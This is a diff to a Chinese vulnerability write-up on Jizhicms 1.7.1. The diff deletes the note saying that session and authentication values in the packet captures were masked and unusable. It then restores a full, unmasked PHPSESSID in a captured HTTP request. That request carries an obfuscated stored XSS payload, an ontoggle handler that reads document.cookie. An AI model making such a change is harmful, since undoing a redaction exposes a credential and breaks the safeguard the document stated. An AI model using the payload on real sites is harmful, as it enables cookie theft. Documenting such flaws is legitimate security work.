@@ -20,7 +20,6 @@ schema_version: "1"
 
 ## 核对与使用边界
 
-- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
 
 本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
 
@@ -61,7 +60,7 @@ Jizhicms 1.7.1
     Origin: http://www.0-sec.org:8091
     Connection: close
     Referer: http://www.0-sec.org:8091/user/release/molds/article.html
-    Cookie: PHPSESSID=84m********************2eo; XDEBUG_SESSION=PHPSTORM
+    Cookie: PHPSESSID=84mcpgsvrgnfag0fnl3ngjm2eo; XDEBUG_SESSION=PHPSTORM
 
     ajax=1&isshow=&molds=article&tid=2&title=%3Cdetails+open+ontoggle%3D+confirm(document%5B%60coo%60%2B%60kie%60%5D)%3E&keywords=123&litpic=&description=123
 
